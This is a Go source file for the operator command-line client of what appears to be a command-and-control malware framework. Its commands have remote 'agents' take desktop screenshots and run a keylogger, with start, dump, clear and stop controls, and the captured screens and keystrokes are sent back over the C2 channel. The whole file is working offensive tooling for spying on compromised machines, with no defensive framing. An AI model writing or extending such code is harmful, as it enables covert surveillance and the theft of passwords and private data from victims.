package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"github.com/spf13/cobra"
)

var screenshotCmd = &cobra.Command{
	Use:   "screenshot <agent-id>",
	Short: "Capture a full desktop screenshot from the agent",
	Long: `Captures the agent's desktop via GDI BitBlt, encodes as PNG, and returns
base64 over the C2 channel. Use --save to write the PNG to a local file.

Examples:
  screenshot 7d019eb7
  screenshot 7d019eb7 --save /tmp/target.png --wait`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		save, _ := cmd.Flags().GetString("save")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/screenshot", nil, "application/json")
		if err != nil {
			printError(fmt.Sprintf("Screenshot failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			printError("Screenshot request failed")
			os.Exit(1)
		}
		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		printSuccess("Screenshot queued")

		if !wait || cmdID == "" {
			if cmdID != "" {
				printInfo(fmt.Sprintf("command_id: %s", cmdID))
			}
			return
		}

		printInfo(fmt.Sprintf("Waiting for screenshot (timeout %ds)...", timeout))
		finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{})
		if !ok {
			return
		}

		output, _ := finalData["output"].(string)
		if output == "" || !strings.HasPrefix(output, "PNG:") {
			displayFinalCommandStatus(finalData, cmdID)
			return
		}

		// Parse "PNG:<size>:<base64>"
		parts := strings.SplitN(output, ":", 3)
		if len(parts) < 3 {
			displayFinalCommandStatus(finalData, cmdID)
			return
		}
		pngBytes, err := base64.StdEncoding.DecodeString(parts[2])
		if err != nil {
			printError(fmt.Sprintf("Failed to decode PNG: %v", err))
			return
		}

		if save != "" {
			if err := os.WriteFile(save, pngBytes, 0644); err != nil {
				printError(fmt.Sprintf("Failed to save PNG: %v", err))
				return
			}
			printSuccess(fmt.Sprintf("Screenshot saved → %s (%d bytes)", save, len(pngBytes)))
		} else {
			printSuccess(fmt.Sprintf("Screenshot received: %d bytes PNG (use --save <path> to write to disk)", len(pngBytes)))
		}
	},
}

var keylogCmd = &cobra.Command{
	Use:   "keylog",
	Short: "Keylogger control (start / dump / stop)",
}

// keylog start <agent-id> [--duration N]
var keylogStartCmd = &cobra.Command{
	Use:   "start <agent-id>",
	Short: "Start keylogger on agent",
	Long: `Start a polling keylogger on the agent. Keystrokes are buffered in memory
and retrieved with 'keylog dump'. Use --duration to auto-stop after N seconds.

Examples:
  keylog start 7d019eb7
  keylog start 7d019eb7 --duration 300 --wait`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		dur, _ := cmd.Flags().GetInt("duration")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		payload, _ := json.Marshal(map[string]int{"duration": dur})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/keylog/start",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Keylog start failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := "unknown error"
			if resp.Error != "" {
				msg = resp.Error
			}
			printError(fmt.Sprintf("Keylog start failed: %s", msg))
			os.Exit(1)
		}
		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		if dur > 0 {
			printSuccess(fmt.Sprintf("Keylogger starting for %ds", dur))
		} else {
			printSuccess("Keylogger starting (use 'keylog stop' to halt)")
		}

		if wait && cmdID != "" {
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}

// keylog dump <agent-id>
var keylogDumpCmd = &cobra.Command{
	Use:   "dump <agent-id>",
	Short: "Retrieve buffered keystrokes from agent",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		timeout, _ := cmd.Flags().GetInt("timeout")

		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/keylog/dump", nil, "application/json")
		if err != nil {
			printError(fmt.Sprintf("Keylog dump failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			printError("Keylog dump request failed")
			os.Exit(1)
		}
		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		printSuccess("Keylog dump queued")

		if cmdID != "" {
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		}
	},
}

// keylog stop <agent-id>
var keylogClearCmd = &cobra.Command{
	Use:   "clear <agent-id>",
	Short: "Discard buffered keystrokes without returning them",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/keylog/clear", nil, "application/json")
		if err != nil {
			printError(fmt.Sprintf("Keylog clear failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			printError("Keylog clear request failed")
			os.Exit(1)
		}
		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		printSuccess("Keylog buffer clear queued")

		if wait && cmdID != "" {
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}

var keylogStopCmd = &cobra.Command{
	Use:   "stop <agent-id>",
	Short: "Stop keylogger and return final buffer",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		timeout, _ := cmd.Flags().GetInt("timeout")

		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/keylog/stop", nil, "application/json")
		if err != nil {
			printError(fmt.Sprintf("Keylog stop failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			printError("Keylog stop request failed")
			os.Exit(1)
		}
		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		printSuccess("Keylogger stop queued — final buffer incoming")

		if cmdID != "" {
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		}
	},
}
